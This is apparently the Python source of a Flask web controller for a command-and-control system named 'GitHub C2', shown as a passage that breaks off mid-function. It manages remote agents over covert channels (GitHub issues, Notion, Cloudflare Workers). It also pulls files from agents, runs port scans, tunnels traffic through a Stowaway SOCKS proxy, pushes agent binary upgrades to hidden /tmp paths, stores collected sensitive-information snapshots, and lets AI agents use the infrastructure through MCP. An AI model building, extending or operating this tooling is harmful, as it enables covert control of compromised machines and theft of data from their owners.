"""
Flask web controller for GitHub C2.
Web control plane (Flask) — the Rust CLI controller was removed long ago.

Bugs fixed vs v1:
  - _send_tunnel_cmd: replaced broken test_request_context with internal helper
  - api_scan: now properly constructs the "scan host ports" command
  - SSE event name collision: renamed internal "message" event → "response"
  - SSE duplicate message listener: fixed in frontend
  - [FILE_UPLOAD_JSON]: now actually saves file to downloads/<hostname>_<id>/
  - _handle_file_list: bare "ls" command → path defaults to "/"

Run:
    pip install -r requirements.txt
    python app.py
Default web password: admin  (change in Settings)
"""
import base64
import json
import logging
import random
import subprocess as _subprocess
import signal as _signal
import os
import queue
import re
import sqlite3
import tempfile
import threading
import time
import uuid
import zipfile
import mimetypes
import requests as _requests   # for sendit.sh background download
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from functools import wraps

_logger = logging.getLogger("c2")
_C2_LOGGER = logging.getLogger("c2")      # 独立 logger：DEBUG 级，不受根 INFO 压制
_C2_LOGGER.setLevel(logging.DEBUG)
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s %(message)s")

def debug_log(msg: str) -> None:
    _C2_LOGGER.debug(msg)

from flask import (Flask, Response, after_this_request, jsonify, redirect,
                   render_template, request, send_file, session, url_for,
                   has_request_context)
from werkzeug.utils import secure_filename

import crypto
import db
from github_api import GitHubClient
from worker_api import WorkerClient
from notion_api import NotionClient

from flask_sock import Sock as _FlaskSock
import websocket as _websocket_client

app = Flask(__name__)
# Persist secret_key in DB so sessions survive restarts and multi-worker deploys.
# Generated once on first run, reused on subsequent starts.
def _get_or_create_secret_key() -> str:
    try:
        conn = _conn()
        val = db.cfg_get(conn, "_secret_key")
        if val:
            return val
        new_key = os.urandom(32).hex()
        db.cfg_set(conn, "_secret_key", new_key)
        return new_key
    except Exception:
        return os.urandom(32).hex()  # fallback: ephemeral key

app.secret_key = os.environ.get("SECRET_KEY") or _get_or_create_secret_key()
app.config["SOCK_SERVER_OPTIONS"] = {"subprotocols": ["tty"]}
# Session stays valid for 30 days (cookie carries Expires; survives browser
# restarts — a browser-session cookie made every reopen look like a blank page).
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)

# ── Login rate limiting ───────────────────────────────────────────────────────
# Track failed attempts per IP: ip → (count, first_fail_time)
_login_fails: dict = {}
_login_lock  = threading.Lock()
_MAX_FAILS   = 5        # lockout after 5 failures
_LOCKOUT_SEC = 600      # locked out for 10 minutes


def _check_rate_limit(ip: str) -> tuple[bool, int]:
    """Return (is_allowed, seconds_remaining). Thread-safe."""
    now = time.time()
    with _login_lock:
        # Purge stale entries for other IPs to prevent unbounded dict growth
        stale = [k for k, (cnt, t) in _login_fails.items()
                 if now - t > _LOCKOUT_SEC]
        for k in stale:
            del _login_fails[k]

        if ip not in _login_fails:
            return True, 0
        count, first = _login_fails[ip]
        elapsed = now - first
        if elapsed > _LOCKOUT_SEC:
            del _login_fails[ip]
            return True, 0
        if count >= _MAX_FAILS:
            remaining = int(_LOCKOUT_SEC - elapsed)
            return False, remaining
        return True, 0


def _record_fail(ip: str):
    now = time.time()
    with _login_lock:
        if ip in _login_fails:
            count, first = _login_fails[ip]
            # Reset window if lockout period passed
            if now - first > _LOCKOUT_SEC:
                _login_fails[ip] = (1, now)
            else:
                _login_fails[ip] = (count + 1, first)
        else:
            _login_fails[ip] = (1, now)


def _clear_fails(ip: str):
    with _login_lock:
        _login_fails.pop(ip, None)

_sock = _FlaskSock(app)

# Download directory — one subfolder per agent: downloads/<hostname>_<id>/
DOWNLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

SCAN_BIN   = "/tmp/.san"

# ── Stowaway admin (headless SOCKS5 proxy server) ────────────────────────────
STOWAWAY_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stowaway")
STOWAWAY_BIN  = os.path.join(STOWAWAY_DIR, "stowaway_admin")
STOWAWAY_PID  = os.path.join(STOWAWAY_DIR, "stowaway.pid")
STOWAWAY_ARGS = os.path.join(STOWAWAY_DIR, "stowaway.args")
STOWAWAY_TMUX = "c2-stowaway"    # fixed tmux session name
os.makedirs(STOWAWAY_DIR, exist_ok=True)   # ensure directory exists at startup

_tmux_ok: "bool | None" = None   # cache tmux availability check


def _has_tmux() -> bool:
    """Check once whether tmux is available on this system."""
    global _tmux_ok
    if _tmux_ok is None:
        try:
            r = _subprocess.run(["tmux", "-V"], capture_output=True, timeout=3)
            _tmux_ok = r.returncode == 0
        except Exception:
            _tmux_ok = False
    return _tmux_ok

# ── Global app state ──────────────────────────────────────────────────────────

_lock  = threading.Lock()
_state = {
    "github_token":  "",
    "github_repos":  [],
    "password":      "",
    "poll_interval": 30,
    "issue_limit":   50,
    "stale_days":    7,
    "tunnel_url":        "",
    "tunnel_ip":         "",
    "tunnel_port":       "9998",
    "tunnel_secret":     "",
    "scan_url":          "",
    # Notion channel
    "notion_token":      "",
    "notion_databases":  [],       # list of database IDs
    # Cloudflare Worker channel (dual-domain relay, comma-joined)
    "worker_urls":       "",
    "worker_secret":     "",
    "worker_path":       "",
    # Stowaway admin
    "stowaway_listen":   "9998",   # port agents connect to
    "stowaway_socks":    "1080",   # local SOCKS5 port
    "stowaway_socks_user": "s5admin",  # fixed SOCKS5 (humans + AI agents share)
    "stowaway_socks_pass": "123456",
    "web_password":  "admin",
    "web_username":  "admin",
    "agents":        [],
    "last_times":    {},           # agent_id → last comment timestamp
    "chunk_buf":     {},           # agent_id → {resp_id: {total, parts, resp_to, type}}
    "cmd_history":   {},           # agent_id → {cmd_id: cmd_text}
    "wspty_host":    "",           # WS Shell controller IP/hostname
    "wspty_port":    "7337",       # WS Shell controller port（与前端默认一致）
    "upgrade_url":       "",       # Agent Upgrade: binary download URL
    "upgrade_dest":  "/tmp/.agent_upg",  # Agent Upgrade: save path on agent
    "upgrade_manual_path": "",     # Agent Upgrade: manual upgrade path
}

_sse_queues: list[queue.Queue] = []
_sse_lock = threading.Lock()

# agent_id → unix timestamp of last received comment (real activity, not poll time)
_agent_last_reply: dict = {}

# ── Activity tracking — pause GitHub polling when no browser is active ─────────
_last_active: float = time.time()   # updated on every authenticated request
# C2_ALWAYS_POLL=1 disables idle pause — MCP/AI agents need background polling
# even when no browser window is open (CyberStrikeAI persist-MCP requirement).
_IDLE_AFTER:  int   = 10**9 if os.environ.get("C2_ALWAYS_POLL") == "1" else 90

# Pending sendit.sh uploads: cmd_id → {"filename": str, "agent": dict, "ts": float}
_sendit_pending: dict = {}
_SENDIT_TIMEOUT = 30 * 60   # 30 minutes


def _sendit_cleanup():
    """Periodically remove expired sendit pending entries (agent never responded)."""
    now = time.time()
    expired = [k for k, v in _sendit_pending.items()
               if now - v.get("ts", now) > _SENDIT_TIMEOUT]
    for k in expired:
        rec = _sendit_pending.pop(k, None) or {}
        aid = (rec.get("agent") or {}).get("id", "")
        fn = rec.get("filename") or "file"
        _emit("notification", {
            "type": "sendit_timeout",
            "agent_id": aid,
            "filename": fn,
            "message": f"sendit 超时（30 分钟），未取回 {fn}",
        })
    try:
        db.sendit_purge(_conn(), now - _SENDIT_TIMEOUT)
    except Exception:
        pass


def _sendit_register(cmd_id: str, filename: str, agent: dict):
    rec = {"filename": filename, "agent": agent, "ts": time.time()}
    _sendit_pending[cmd_id] = rec
    try:
        db.sendit_put(_conn(), cmd_id, filename, agent, rec["ts"])
    except Exception as e:
        debug_log(f"sendit persist failed: {e}")


def _sendit_claim(cmd_id: str):
    """Pop a pending sendit row from memory, falling back to DB after restart."""
    info = _sendit_pending.pop(cmd_id, None)
    try:
        row = db.sendit_pop(_conn(), cmd_id)
    except Exception:
        row = None
    return info or row


def _parse_msg_ts(ts):
    """Parse messages.timestamp (ISO, optional Z/offset) to unix seconds."""
    if not ts:
        return None
    try:
        s = str(ts)
        dt = datetime.fromisoformat(s.replace("Z", "+00:00")) if ("Z" in s or "+" in s[10:]) \
             else datetime.fromisoformat(s)
        return dt.timestamp()
    except Exception:
        return None


def _last_reply_fallback_map(conn) -> dict:
    """agent_id → unix ts from the latest non-command message (survives restart)."""
    fallback = {}
    try:
        rows = conn.execute(
            "SELECT m.agent_id, m.timestamp FROM messages m "
            "JOIN (SELECT agent_id, MAX(id) AS mid FROM messages "
            "      WHERE is_command=0 GROUP BY agent_id) t ON m.id = t.mid"
        ).fetchall()
        for aid, ts in rows:
            parsed = _parse_msg_ts(ts)
            if parsed:
                fallback[aid] = parsed
    except Exception:
        pass
    return fallback


def _annotate_last_reply(agents, conn, now=None):
    """Stamp last_reply_ts / last_reply_ago.

    Live watermark first, then an already-stamped value on the row (discover /
    previous annotate), then the messages table so a restart still sees who
    answered last. last_seen is only a sort tie-breaker — GitHub bumps it on
    our own <!-- c --> comments.
    """
    now = now if now is not None else time.time()
    fb = _last_reply_fallback_map(conn)
    for a in agents:
        last = (_agent_last_reply.get(a["id"])
                or a.get("last_reply_ts")
                or fb.get(a["id"]))
        a["last_reply_ts"]  = last
        a["last_reply_ago"] = int(now - last) if last else None
    return agents


def _agent_uuid_of(a) -> str:
    return (a.get("agent_uuid") or "").strip()


def _worker_short_id(a) -> str:
    aid = str(a.get("id") or "")
    if (a.get("channel") == "worker" or aid.startswith("w-")) and aid.startswith("w-") and len(aid) > 2:
        return aid[2:10]
    return ""


def _same_machine(a, b) -> bool:
    """GitHub issue 行与 Worker w-<uuid8> 行是否同一台机器。"""
    if a is b:
        return True
    ua, ub = _agent_uuid_of(a), _agent_uuid_of(b)
    if ua and ub and ua == ub:
        return True
    wa, wb = _worker_short_id(a), _worker_short_id(b)
    if wa and ub and ub.startswith(wa):
        return True
    if wb and ua and ua.startswith(wb):
        return True
    if wa and wb and wa == wb:
        return True
    return False


def _agent_recency_tuple(a) -> tuple:
    lr = a.get("last_reply_ts") or 0
    ls = _parse_msg_ts(a.get("last_seen") or "") or 0
    # last_reply 相同（含都空）时 Worker 主通道优先，避免首令打到 GitHub 备。
    worker = 1 if (a.get("channel") or "") == "worker" else 0
    return (lr, worker, ls)


def _all_known_agents() -> list:
    with _lock:
        mem = list(_state.get("agents") or [])
    try:
        db_rows = db.agent_list(_conn())
    except Exception:
        db_rows = []
    seen = set()
    out = []
    for a in mem + db_rows:
        key = (str(a.get("id")), a.get("repo") or "", a.get("channel") or "")
        if key in seen:
            continue
        seen.add(key)
        out.append(a)
    return out


def _sibling_agents(agent, pool=None) -> list:
    pool = pool if pool is not None else _all_known_agents()
    return [x for x in pool if _same_machine(agent, x)]


def _sibling_ids_for(agent_id: str, pool=None) -> list:
    pool = pool if pool is not None else _all_known_agents()
    hit = next((a for a in pool if str(a.get("id")) == str(agent_id)), None)
    if not hit:
        return [agent_id]
    ids = []
    for a in _sibling_agents(hit, pool):
        aid = str(a.get("id") or "")
        if aid and aid not in ids:
            ids.append(aid)
    return ids or [agent_id]


def _token_hint(tok: str) -> str:
    t = (tok or "").strip()
    if not t:
        return ""
    return t[-4:] if len(t) >= 4 else t


def _token_hints(raw: str) -> list:
    return [_token_hint(t) for t in (raw or "").split(",") if t.strip()]


def _apply_token_keep_add(existing: str, keep_hints, add_list) -> str:
    """Rebuild a comma-separated token list from last-4 hints + newly added tokens."""
    hints = [str(h).strip() for h in (keep_hints or []) if str(h).strip()]
    kept = []
    for t in (existing or "").split(","):
        t = t.strip()
        if not t:
            continue
        h = _token_hint(t)
        if h in hints:
            kept.append(t)
            hints.remove(h)
    for t in add_list or []:
        t = str(t).strip() if t is not None else ""
        if t and t not in kept:
            kept.append(t)
    return ",".join(kept)


def _note_get_any(conn, agent_id) -> str:
    ids = _sibling_ids_for(agent_id)
    ordered = [agent_id] + [i for i in ids if i != agent_id]
    for aid in ordered:
        n = db.note_get(conn, aid)
        if n:
            return n
    return ""


def _note_set_all(conn, agent_id, note: str):
    for aid in _sibling_ids_for(agent_id):
        db.note_set(conn, aid, note)


def _fl_get_any(conn, agent_id, path):
    seen = {}
    for aid in _sibling_ids_for(agent_id):
        for e in db.fl_get(conn, aid, path) or []:
            key = (e.get("name"), e.get("is_dir"))
            if key not in seen:
                seen[key] = e
    return list(seen.values())


def _pick_latest_snapshot(rows):
    best = None
    for r in rows:
        if not r:
            continue
        if best is None:
            best = r
            continue
        ca, ba = r.get("collected_at") or "", best.get("collected_at") or ""
        if ca > ba or (ca == ba and (r.get("id") or 0) > (best.get("id") or 0)):
            best = r
    return best


def _si_latest_any(conn, agent_id):
    return _pick_latest_snapshot(
        db.si_latest(conn, aid) for aid in _sibling_ids_for(agent_id))


def _si_history_any(conn, agent_id):
    out = []
    for aid in _sibling_ids_for(agent_id):
        out.extend(db.si_history(conn, aid) or [])
    out.sort(key=lambda r: (r.get("collected_at") or "", r.get("id") or 0), reverse=True)
    return out[:50]


def _si_by_id_any(conn, agent_id, sid):
    for aid in _sibling_ids_for(agent_id):
        c = db.si_by_id(conn, aid, sid)
        if c:
            return c
    return None


def _sen_latest_any(conn, agent_id):
    return _pick_latest_snapshot(
        db.sen_latest(conn, aid) for aid in _sibling_ids_for(agent_id))


def _sen_history_any(conn, agent_id):
    out = []
    for aid in _sibling_ids_for(agent_id):
        out.extend(db.sen_history(conn, aid) or [])
    out.sort(key=lambda r: (r.get("collected_at") or "", r.get("id") or 0), reverse=True)
    return out[:50]


def _sen_by_id_any(conn, agent_id, sid):
    for aid in _sibling_ids_for(agent_id):
        c = db.sen_by_id(conn, aid, sid)
        if c:
            return c
    return None


def _cmd_list_any(conn, agent_id):
    out = {}
    for aid in _sibling_ids_for(agent_id):
        out.update(db.cmd_list(conn, aid) or {})
    return out


def _agent_row(agent_id: str):
    """Resolve an agent dict by id, then by sibling (DB + memory)."""
    aid = str(agent_id or "")
    if not aid:
        return None
    with _lock:
        hit = next((a for a in (_state.get("agents") or [])
                    if str(a.get("id")) == aid), None)
    if hit:
        return hit
    pool = _all_known_agents()
    hit = next((a for a in pool if str(a.get("id")) == aid), None)
    if hit:
        return hit
    for sib in _sibling_ids_for(aid, pool):
        hit = next((a for a in pool if str(a.get("id")) == str(sib)), None)
        if hit:
            return hit
    return None


def _worker_discovery_blocked() -> bool:
    with _lock:
        return bool((_state.get("worker_urls") or "").strip()
                    and (_state.get("worker_secret") or "").strip()
                    and not (_state.get("password") or "").strip())


def _apply_token_keep_indices(existing: str, keep_indices, add_list) -> str:
    parts = [t.strip() for t in (existing or "").split(",") if t.strip()]
    kept = []
    for i in keep_indices or []:
        try:
            i = int(i)
        except (TypeError, ValueError):
            continue
        if 0 <= i < len(parts) and parts[i] not in kept:
            kept.append(parts[i])
    for t in add_list or []:
        t = str(t).strip() if t is not None else ""
        if t and t not in kept:
            kept.append(t)
    return ",".join(kept)


def _collapse_dual_channel_agents(agents: list, now=None) -> list:
    """同一 uuid 的 GitHub + Worker 行收成一条，id 取最近活跃通道。"""
    now = now if now is not None else time.time()
    used = [False] * len(agents)
    out = []
    for i, a in enumerate(agents):
        if used[i]:
            continue
        group = [a]
        used[i] = True
        for j in range(i + 1, len(agents)):
            if used[j]:
                continue
            if _same_machine(a, agents[j]):
                group.append(agents[j])
                used[j] = True
        group.sort(key=_agent_recency_tuple, reverse=True)
        canon = dict(group[0])
        sibs, chans = [], []
        best_lr = 0
        gh_repo = ""
        note = canon.get("note") or ""
        for x in group:
            xid = str(x.get("id") or "")
            if xid and xid not in sibs:
                sibs.append(xid)
            ch = x.get("channel") or "github"
            if ch not in chans:
                chans.append(ch)
            lr = x.get("last_reply_ts") or 0
            if lr and lr > best_lr:
                best_lr = lr
            if not note and x.get("note"):
                note = x["note"]
            if x.get("channel") == "github" and x.get("repo"):
                gh_repo = x["repo"]
        if gh_repo:
            canon["repo"] = gh_repo
        if note:
            canon["note"] = note
        canon["sibling_ids"] = sibs
        canon["channels"] = chans
        if best_lr:
            canon["last_reply_ts"] = best_lr
            canon["last_reply_ago"] = int(now - best_lr)
        out.append(canon)
    return out


def _agents_for_ui(conn, now=None) -> list:
    now = now if now is not None else time.time()
    agents = db.agent_list(conn)
    for a in agents:
        a["note"] = db.note_get(conn, a["id"])
    _annotate_last_reply(agents, conn, now)
    return _collapse_dual_channel_agents(agents, now)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _conn():
    return db.get_conn()


def _emit(event: str, data: dict):
    """Push named SSE event to all connected browser clients."""
    msg = f"event: {event}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"
    with _sse_lock:
        dead = []
        for q in _sse_queues:
            try:
                q.put_nowait(msg)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _sse_queues.remove(q)



def _audit(action: str, agent_id: str = "", detail: str = ""):
    """Record an operator action in the audit trail.
    Never raises — auditing must not break the audited operation. Works both
    inside request contexts (reads the session username) and from background
    threads (operator recorded as '')."""
    operator = ""
    try:
        if has_request_context():
            operator = session.get("username") or ""
    except Exception:
        pass
    try:
        db.audit_log(_conn(), operator, action, agent_id, detail)
    except Exception:
        pass


def _safe_int(val, default: int = 0) -> int:
    try:
        return int(val)
    except (ValueError, TypeError):
        return default


def _pick_token() -> str:
    """Pick a random token from the comma-separated github_token value.
    Multiple tokens rotate per API call, reducing rate-limit pressure.

    Settings 没填时沿用 Builder 的 GitHub PAT：双通道只在编包里填了备用
    凭据、主表忘了加仓库/Token 时，发现/杀信号/发令仍扫得到 GitHub。
    """
    raw = _state.get("github_token", "")
    tokens = [t.strip() for t in raw.split(",") if t.strip()]
    if tokens:
        return random.choice(tokens)
    try:
        b = (db.cfg_get(_conn(), "builder_github_token") or "").strip()
        if b:
            return b
    except Exception:
        pass
    return ""


def _github_repos_effective(conn=None) -> list:
    """Settings 仓库 + Builder 备用仓库（去重，保序）。"""
    repos = [r.strip() for r in (_state.get("github_repos") or []) if str(r).strip()]
    seen = set(repos)
    try:
        c = conn or _conn()
        extra = (db.cfg_get(c, "builder_github_repo") or "").strip()
        if extra and "/" in extra and extra not in seen:
            repos.append(extra)
    except Exception:
        pass
    return repos


def _merge_worker_urls(existing: str, new_url: str) -> str:
    """一键部署不覆盖已有的自定义域名互备列表，新 workers.dev 置顶。"""
    new_url = (new_url or "").strip().rstrip("/")
    parts = []
    seen = set()
    for p in [new_url] + [x.strip().rstrip("/") for x in (existing or "").split(",")]:
        if p and p not in seen:
            seen.add(p)
            parts.append(p)
    return ",".join(parts)


def _sync_builder_github_into_settings(conn=None) -> bool:
    """编包选 github/dual 时，把备用仓库写入 Settings 扫描列表。"""
    c = conn or _conn()
    ch = (db.cfg_get(c, "builder_channel") or "").strip()
    repo = (db.cfg_get(c, "builder_github_repo") or "").strip()
    if ch not in ("dual", "github") or not repo or "/" not in repo:
        return False
    with _lock:
        repos = list(_state.get("github_repos") or [])
        if repo in repos:
            return False
        repos.append(repo)
        _state["github_repos"] = repos
    _save_config()
    debug_log(f"builder: added {repo} to Settings github_repos")
    return True


def _safe_fname(name: str) -> str:
    """Sanitize a file name destined for the downloads dir.

    Strips any directory components (../ traversal) and refuses dot-names;
    every caller-supplied or agent-supplied name MUST pass through this
    before os.path.join(DOWNLOADS_DIR, ...) — otherwise a crafted name can
    escape the download folder and write elsewhere on the controller host.
    """
    base = os.path.basename(str(name).replace("\\", "/")).strip()
    if base in ("", ".", ".."):
        return "file"
    return base


def _agent_download_dir(agent: dict) -> str:
    """Get (and create) download directory for an agent.

    hostname 与 id 都清洗：worker 渠道 id 来自注册方自报（经 D1 原样回流），
    恶意注册方可投毒 ../ —— 拼路径前必须消毒（同型漏洞第三处，终修）。"""
    safe = re.sub(r"[^\w\-.]", "_", agent.get("hostname", "unknown"))
    safe_id = re.sub(r"[^\w\-.]", "_", str(agent.get("id", "agent")))
    folder = f"{safe}_{safe_id}"
    path = os.path.join(DOWNLOADS_DIR, folder)
    os.makedirs(path, exist_ok=True)
    return path


def _load_config():
    conn = _conn()
    with _lock:
        for key in ("github_token", "password", "tunnel_ip",
                    "tunnel_port", "tunnel_secret", "web_password", "web_username",
                    "scan_url", "stowaway_listen", "stowaway_socks", "stowaway_socks_user", "stowaway_socks_pass",
                    "notion_token", "wspty_host", "wspty_port",
                    "upgrade_url", "upgrade_dest", "upgrade_manual_path",
                    "worker_urls", "worker_secret", "worker_path"):
            v = db.cfg_get(conn, key)
            if v is not None:
                _state[key] = v
        raw_ndb = db.cfg_get(conn, "notion_databases")
        if raw_ndb:
            _state["notion_databases"] = [d.strip() for d in raw_ndb.split(",") if d.strip()]
        for key in ("poll_interval", "issue_limit", "stale_days"):
            v = db.cfg_get(conn, key)
            if v is not None:
                try:
                    _state[key] = int(v)
                except ValueError:
                    pass
        raw = db.cfg_get(conn, "github_repos")
        if raw:
            _state["github_repos"] = [r.strip() for r in raw.split(",") if r.strip()]

        # ── First-run secrets ─────────────────────────────────────────────
        # Fresh installs get a RANDOM web password and Stowaway transport
        # secret instead of well-known defaults. Env vars win (lab override).
        import secrets as _secrets
        import string as _string

        if os.environ.get("WEB_USERNAME") and db.cfg_get(conn, "web_username") is None:
            _state["web_username"] = os.environ["WEB_USERNAME"]
        env_web = (os.environ.get("WEB_PASSWORD") or "").strip()
        db_web = db.cfg_get(conn, "web_password")
        if env_web and not (db_web or "").strip():
            _state["web_password"] = env_web
            db.cfg_set(conn, "web_password", env_web)
        elif db.cfg_get(conn, "web_password") is None:
            _alpha = _string.ascii_letters + _string.digits
            _state["web_password"] = "".join(_secrets.choice(_alpha) for _ in range(14))
            db.cfg_set(conn, "web_password", _state["web_password"])
            print("=" * 60)
            print("  First run: generated web credentials (saved to DB)")
            print(f"    username: {_state['web_username']}")
            print(f"    password: {_state['web_password']}")
            print("  Override for labs: WEB_USERNAME / WEB_PASSWORD env vars")
            print("=" * 60)
        elif _state.get("web_password") == "admin":
            debug_log("web_password is the well-known default 'admin' — change it in Settings")

        # Stowaway transport secret: admin (-s) and the agent's `tunnel` command
        # MUST use the same value. 五轮审计（合理性）：首启改为随机生成并打印
        # ——旧默认 "123456" 是文档化弱口令，中继监听端口（9998）可达时等于
        # 不设防；agent 侧 secret 由控制器 `tunnel IP:PORT SECRET` 命令下发，
        # 操作员无需手工记忆。存量部署保留旧值（改了会打断在线隧道），但告警。
        if not _state.get("tunnel_secret", "").strip():
            _alpha_ts = _string.ascii_letters + _string.digits
            _state["tunnel_secret"] = "".join(_secrets.choice(_alpha_ts) for _ in range(16))
            db.cfg_set(conn, "tunnel_secret", _state["tunnel_secret"])
            print(f"  First run: tunnel_secret (stowaway) = {_state['tunnel_secret']}")
        elif _state.get("tunnel_secret") == "123456":
            _logger.warning(
                "tunnel_secret 是历史默认值 '123456'（stowaway 监听端口可达时等于不设防）。"
                "建议 Settings → 隧道 Secret 改成强随机值；改后需重启在线隧道与 agent。")

        # 部署时写入的通信加密 Secret（C2_PASSWORD）：库里还没有才落库。
        # 已有值不覆盖，避免 Settings 改过之后被 .runtime.env 旧值打回去。
        _maybe_seed_c2_password(conn)
        _migrate_builder_dual(conn)

    # Load persisted agents into memory so the poller can start immediately
    # without requiring a manual refresh after every restart.
    agents = db.agent_list(conn)
    with _lock:
        _state["agents"] = agents
        _state["last_times"].update(db.cursor_all(conn))

    # Revive in-flight sendit downloads that were waiting when we last died.
    try:
        _sendit_pending.update(db.sendit_load(conn))
    except Exception as e:
        debug_log(f"sendit hydrate: {e}")


def _save_config():
    conn = _conn()
    with _lock:
        for key in ("github_token", "password", "tunnel_ip",
                    "tunnel_port", "tunnel_secret", "web_password", "web_username",
                    "poll_interval", "issue_limit", "stale_days", "scan_url",
                    "stowaway_listen", "stowaway_socks", "stowaway_socks_user", "stowaway_socks_pass", "notion_token",
                    "wspty_host", "wspty_port",
                    "upgrade_url", "upgrade_dest", "upgrade_manual_path",
                    "worker_urls", "worker_secret", "worker_path"):
            db.cfg_set(conn, key, str(_state[key]))
        db.cfg_set(conn, "notion_databases", ",".join(_state.get("notion_databases", [])))
        db.cfg_set(conn, "github_repos", ",".join(_state["github_repos"]))


def _maybe_seed_c2_password(conn):
    """首次启动：C2_PASSWORD 或已有 Settings 密码写入通信 Secret，并同步编包密码。

    只在对应字段为空时写入。部署脚本把 Secret 写进 .runtime.env；控制器启动
    读到后落库，之后编包留空即沿用，不必每次再填。
    """
    env_pw = (os.environ.get("C2_PASSWORD") or "").strip()
    pw = (_state.get("password") or "").strip()
    if not pw and env_pw:
        pw = env_pw
        _state["password"] = pw
        db.cfg_set(conn, "password", pw)
    if pw and not (db.cfg_get(conn, "builder_password") or "").strip():
        db.cfg_set(conn, "builder_password", pw)


def _sync_builder_password(conn, password: str):
    """Settings 通信 Secret 与编包密码共用同一份。"""
    db.cfg_set(conn, "builder_password", password or "")


def _sync_runtime_env_key(key: str, value: str) -> None:
    """Settings 改 Web 密码后写回 .runtime.env，避免重启被旧 env 盖回去。"""
    env_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            ".runtime.env")
    if not os.path.isfile(env_path):
        return
    try:
        import shlex
        q = shlex.quote(value or "")
        lines = open(env_path, encoding="utf-8").read().splitlines()
        out, found = [], False
        prefix = key + "="
        for line in lines:
            if line.startswith(prefix):
                out.append(f"{prefix}{q}")
                found = True
            else:
                out.append(line)
        if not found:
            out.append(f"{prefix}{q}")
        with open(env_path, "w", encoding="utf-8") as f:
            f.write("\n".join(out) + "\n")
        try:
            os.chmod(env_path, 0o600)
        except OSError:
            pass
    except Exception as e:
        debug_log(f"sync runtime env {key}: {e}")


def _promote_builder_to_dual(conn) -> bool:
    """一键部署 Worker 后：github/空 → dual（只第一次）。

    操作员后来改回 GitHub 单通道，再点部署不应被静默改回 dual。
    """
    if (db.cfg_get(conn, "builder_dual_promoted") or "").strip():
        return False
    ch = (db.cfg_get(conn, "builder_channel") or "github").strip() or "github"
    if ch in ("github", ""):
        db.cfg_set(conn, "builder_channel", "dual")
        db.cfg_set(conn, "builder_dual_promoted", "1")
        _sync_builder_github_into_settings(conn)
        return True
    return False


def _migrate_builder_dual(conn):
    """旧版「GitHub + 已填 Worker 三件套」一次性标成 dual。

    只跑一次。之后操作员若改回 GitHub 单通道，即使库里还留着 Worker 凭据
    也不会再被改回双通道。
    """
    if (db.cfg_get(conn, "builder_dual_migrated") or "").strip():
        return
    ch = (db.cfg_get(conn, "builder_channel") or "github").strip() or "github"
    urls = (db.cfg_get(conn, "builder_worker_urls") or "").strip()
    secret = (db.cfg_get(conn, "builder_worker_secret") or "").strip()
    path = (db.cfg_get(conn, "builder_worker_path") or "").strip()
    if ch == "github" and urls and secret and path:
        db.cfg_set(conn, "builder_channel", "dual")
    db.cfg_set(conn, "builder_dual_migrated", "1")


# ── Background poller ─────────────────────────────────────────────────────────

def _prefer_newer_issue(keep: dict, uuid: str, issue_id) -> None:
    """Same uuid, multiple open issues: keep the newest number (GitHub lists
    created-desc, so a naive last-write-wins would keep the oldest)."""
    if not uuid:
        return
    prev = keep.get(uuid)
    try:
        if prev is None or int(issue_id) > int(prev):
            keep[uuid] = issue_id
    except (TypeError, ValueError):
        keep[uuid] = issue_id


def _discover_agents(conn) -> list:
    """Scan configured channels for agents and upsert them into the DB.

    Shared by the manual refresh endpoint and the background poller — without
    this the poller only ever polls *already known* agents, so a brand-new
    deployment (empty DB) stays invisible until someone clicks Refresh.
    """
    with _lock:
        gh_token = _pick_token()
        repos    = _github_repos_effective(conn)
        n_token  = _state.get("notion_token", "")
        n_dbs    = list(_state.get("notion_databases", []))
        w_urls   = _state.get("worker_urls", "")
        w_secret = _state.get("worker_secret", "")
        w_path   = _state.get("worker_path", "")
        c2_pass  = _state.get("password", "")

    found = []
    if w_urls and w_secret:
        if not c2_pass:
            debug_log("_discover_agents: Worker 已配但控制器解密密码为空，跳过发现（无法解密注册体，无法与 GitHub 行合流）")
        else:
            try:
                for a in WorkerClient(w_secret, w_urls, w_path, c2_pass).get_agents():
                    db.agent_upsert(conn, a)
                    found.append(a)
            except Exception as e:
                debug_log(f"_discover_agents: Worker error: {e}")
    if gh_token:
        for repo in repos:
            try:
                gh = GitHubClient(gh_token, repo)
                ags = gh.get_agents()
                keep = {}
                for a in ags:
                    a["repo"]    = repo
                    a["channel"] = "github"
                    db.agent_upsert(conn, a)
                    uuid = a.get("agent_uuid") or ""
                    if uuid:
                        _prefer_newer_issue(keep, uuid, a["id"])
                    found.append(a)
                # same machine re-registered on a new issue → drop the stale row
                if keep:
                    db.agent_prune_duplicates(conn, repo, keep)
            except Exception as e:
                debug_log(f"_discover_agents: GitHub repo={repo} error: {e}")
    if n_token:
        for db_id in n_dbs:
            try:
                nc = NotionClient(n_token, db_id)
                for a in nc.get_agents():
                    db.agent_upsert(conn, a)
                    found.append(a)
            except Exception as e:
                debug_log(f"_discover_agents: Notion db={db_id} error: {e}")
    return found


# Bug#7 fix: a KILLALL that stays open forever insta-kills every agent
# launched while it lingers. Auto-close after a TTL (default 1h — plenty for
# every live agent to see it, short enough not to ambush later deployments).
_KILLSWITCH_TTL = int(os.environ.get("C2_KILLSWITCH_TTL", "3600"))


def _killswitch_sweep():
    """Auto-close expired kill signals on every configured channel."""
    cutoff = datetime.now(timezone.utc).timestamp() - _KILLSWITCH_TTL
    with _lock:
        w_urls, w_secret, w_path = (_state.get("worker_urls", ""),
                                    _state.get("worker_secret", ""),
                                    _state.get("worker_path", ""))
        gh_token = _pick_token()
        repos = _github_repos_effective()
    try:
        if w_urls and w_secret:
            st = WorkerClient(w_secret, w_urls, w_path).kill_status()
            raised = st.get("raised_at")
            if st.get("active") and raised:
                try:
                    ts = datetime.fromisoformat(raised.replace("Z", "+00:00")).timestamp()
                except ValueError:
                    ts = 0
                if ts and ts < cutoff:
                    WorkerClient(w_secret, w_urls, w_path).deactivate_kill_signal()
                    _logger.warning(f"killswitch sweep: worker signal expired (raised {raised}) — disarmed")
    except Exception as e:
